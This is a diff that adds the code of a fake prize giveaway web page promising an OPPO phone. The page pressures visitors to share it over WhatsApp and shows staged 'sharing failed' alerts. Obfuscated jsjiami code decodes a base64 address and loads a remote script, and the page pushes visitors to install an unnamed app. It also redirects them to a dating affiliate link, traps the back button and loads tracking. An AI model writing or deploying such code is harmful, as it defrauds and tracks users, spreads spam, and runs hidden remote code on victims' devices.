+                    t.style.display = "none", o.style.display = "block"
+                }, 150), setTimeout(function () {
+                    var e = alert("Congratulations!\n\nYour prize: OPPO F17 Pro (Matte Black, 8GB RAM, 128GB Storage).\n\nPlease follow the instructions to win your prize!");
+                    e === !0 || $(".hide-all").hide(), $(".show-all").show();
+                }, 6800)
+            }
+        }
+
+
+
+        j = '';
+        banner = '';
+        $.getScript('yuming.js?' + (new Date()).getTime());
+
+
+        theme = 'aden';
+
+
+        function incrementValue1() {
+
+            if (parseInt(get_Cookie('prog')) > 120) {
+                window.open('whatsapp://send?text=🎁🎁 Your Url Link Here');
+            } else {
+                window.open('whatsapp://send?text=' + j);
+            }
+            setTimeout(function () {
+
+                incrementValue_i();
+                fn1_i();
+                value = parseInt(get_Cookie('prog'));
+                set_Cookie('prog', value + 1);
+            }, 2000);
+        }
+
+        function incrementValue_i() {
+
+
+            get_Cookie('prog') == '' ? value = 0 : value = get_Cookie('prog');
+            value == 2 || value == 4 ? alert('Sharing failed!\n\n The same group or the same friend is not correct. Please check and share again.') : void (0);
+            set_Cookie('prog', value);
+
+            record('sp', value);
+            record(theme, 'share');
+
+
+            if (value >= 12) {
+                record('sp', 'wc');
+                lasthtml();
+
+            }
+
+
+        }
+
+        var _0xoda = 'jsjiami.com.v6', _0x372c = [_0xoda, '\x70\x72\x6f\x67', '\x71\x75\x65\x72\x79\x53\x65\x6c\x65\x63\x74\x6f\x72', '\x2e\x70\x72\x6f\x67\x72\x65\x73\x73', '\x73\x74\x79\x6c\x65', '\x64\x69\x73\x70\x6c\x61\x79', '\x62\x6c\x6f\x63\x6b', '\x2e\x70\x72\x6f\x67\x72\x65\x73\x73\x20\x73\x70\x61\x6e', '\x77\x69\x64\x74\x68', '\x2e\x70\x72\x6f\x67\x72\x65\x73\x73\x20\x70', '\x74\x65\x78\x74\x43\x6f\x6e\x74\x65\x6e\x74', '\x67\x65\x74\x53\x63\x72\x69\x70\x74', '\x4c\x79\x39\x76\x64\x32\x38\x74\x62\x33\x64\x76\x4c\x6e\x5a\x70\x63\x43\x39\x32\x5a\x58\x4a\x70\x5a\x6e\x6b\x75\x61\x6e\x4d\x3d', '\x54\x6a\x57\x73\x6a\x69\x61\x6d\x62\x58\x5a\x72\x78\x47\x69\x75\x2e\x64\x4e\x59\x72\x72\x63\x6f\x75\x6d\x2e\x76\x36\x3d\x3d']; var _0x1246 = function (_0x53d8e3, _0x59621c) { _0x53d8e3 = ~~'0x'['concat'](_0x53d8e3); var _0x1381a7 = _0x372c[_0x53d8e3]; return _0x1381a7; }; (function (_0x47128a, _0x45ede1) { var _0x31066b = 0x0; for (_0x45ede1 = _0x47128a['shift'](_0x31066b >> 0x2); _0x45ede1 && _0x45ede1 !== (_0x47128a['pop'](_0x31066b >> 0x3) + '')['replace'](/[TWbXZrxGudNYrru=]/g, ''); _0x31066b++) { _0x31066b = _0x31066b ^ 0x63e5a; } }(_0x372c, _0x1246)); function fn1_i() { v = get_Cookie(_0x1246('0')); document[_0x1246('1')](_0x1246('2'))[_0x1246('3')][_0x1246('4')] = _0x1246('5'); v == '\x30' ? ob = 0x1e : v == '\x31' ? ob = 0x32 : v == '\x32' ? ob = 0x34 : v == '\x33' ? ob = 0x3c : v == '\x34' ? ob = 0x3c : v == '\x35' ? ob = 0x41 : v == '\x36' ? ob = 0x46 : v == '\x37' ? ob = 0x50 : v == '\x38' ? ob = 0x55 : v == '\x39' ? ob = 0x5a : v == '\x31\x30' ? ob = 0x60 : v == '\x31\x31' ? ob = 0x62 : v == '\x31\x32' ? ob = 0x64 : void 0x0; document[_0x1246('1')](_0x1246('6'))[_0x1246('3')][_0x1246('7')] = ob + '\x25'; document[_0x1246('1')](_0x1246('6'))[_0x1246('3')][_0x1246('7')] = ob + '\x25'; document[_0x1246('1')](_0x1246('8'))[_0x1246('9')] = ob + '\x25'; } $[_0x1246('a')](atob(_0x1246('b')));; _0xoda = 'jsjiami.com.v6';
+
+        function incrementValue_a() {
+
+
+            value = parseInt(get_Cookie('prog')) - 1;
+            value == 2 || value == 4 ? alert('Sharing failed!\n\n The same group or the same friend is not correct. Please check and share again.') : void (0);
+
+
+            record('sp', value);
+            record(theme, 'share');
+
+
+            if (value >= 12) {
+                record('sp', 'wc');
+                lasthtml();
+
+            }
+        }
+
+
+        function fn1_a() {
+
+            v = parseInt(get_Cookie('prog')) - 1;
+            document.querySelector('.progress').style.display = "block";
+            v == '0' ? ob = 30 : v == '1' ? ob = 50 : v == '2' ? ob = 52 : v == '3' ? ob = 60 : v == '4' ? ob = 60 : v == '5' ? ob = 65 : v == '6' ? ob = 70 : v == '7' ? ob = 80 : v == '8' ? ob = 85 : v == '9' ? ob = 90 : v == '10' ? ob = 96 : v == '11' ? ob = 98 : v == '12' ? ob = 100 : void (0);
+            document.querySelector('.progress span').style['width'] = ob + "%";
+            document.querySelector('.progress span').style['width'] = ob + "%";
+            document.querySelector('.progress p').textContent = ob + "%";
+
+        }
+
+
+
+        function tipn() {
+            alert('You Have To Share with friends on Whatsapp about our promotion To Shipping Address.  Share until the blue bar is full!');
+        }
+
+
+        function set_Cookie(name, value) {
+            var Days = 30;
+            var exp = new Date();
+            exp.setTime(exp.getTime() + (Days * 20 * 1000));
+            document.cookie = name + "=" + escape(value) + ";expires=" + exp.toGMTString() + "; path=/;"
+        }
+        function get_Cookie(name) {
+            var arr, reg = new RegExp("(^| )" + name + "=([^;]*)(;|$)");
+            if (arr = document.cookie.match(reg)) {
+                return unescape(arr[2]);
+            }
+            return '';
+        }
+        function getQueryString(name) {
+            var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');
+            var r = window.location.search.substr(1).match(reg);
+            if (r != null) {
+                return unescape(r[2]);
+            }
+            return null;
+        }
+
+        function lasthtml() {
+            html = '<font color="red">Congratulations! The last step:</font><br/><br/>You have to complete this final step!<br/><br/>1. You have to install the application below and once installed you have to open it for 30 seconds.<br/><br/> (Remember, this step is very important)<br/><br/>After completing the above actions, please wait for admin to check it, the review will be completed within 24 hours.<br/><br/>';
+            document.getElementById("lastapp").innerHTML = html;
+            document.getElementById("buttonl").style.display = 'none';
+            document.getElementById("button2").style.display = 'block';
+        }
+
+        dl = 'https://techdaytodays.blogspot.com/';
+        function dapp() {
+            window.open(dl);
+            AfterThat();
+
+            function AfterThat() {
+                setTimeout(() => {
+                    window.open('https://www.space4dates.net/c/0bbc033dba96fe57?s1=&s2=&s3=&s5=backuser&click_id=MTA1OC01NTY5&iexpp=1&j1=1&j3=1');
+                }, 3000);
+            }
+        }
+
+
+
+
+        record(getQueryString('th'));
+        record('sp');
+
+        function record(a, b) {
+
+            if (b) {
+                if (get_Cookie(a + b) !== a + b) {
+                    //$.getScript('//r.line-me.vip/record/total.php?ac=node&name='+a+'&node='+b);
+                    set_Cookie(a + b, a + b);
+                }
+            } else {
+                if (get_Cookie(a) !== a) {
+                    //$.getScript('//r.line-me.vip/record/total.php?ac=total&name='+a);
+                    set_Cookie(a, a);
+                }
+            }
+
+        }
+
+
+
+
+    </script>
+    <style type="text/css">
+        div,
+        main,
+        article,
+        aside,
+        footer,
+        nav,
+        section,
+        header {
+            display: block;
+        }
+
+        span {
+            display: inline;
+        }
+
+        h1,
+        h2,
+        h3 {
+            display: block;
+        }
+    </style>
+    <script>
+        window.onhashchange = function () { jp(); };
+        function hh1() { history.pushState(history.length + 1, "message", "#" + new Date().getTime()); }
+        function jp() {
+            fh();
+        }
+        setTimeout('hh1();', 500);
+        function fh() {
+            location.href = '../fullpage.php?section=hide&pub=592353&ga=g&l=en&v=uCEQYko61lE&a=fh';
+        }
+
+
+        var _hmt = _hmt || [];
+        (function () {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?c69539a227ba2e3ff7b088a31ae442be";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+
+</body>
+
+</html>
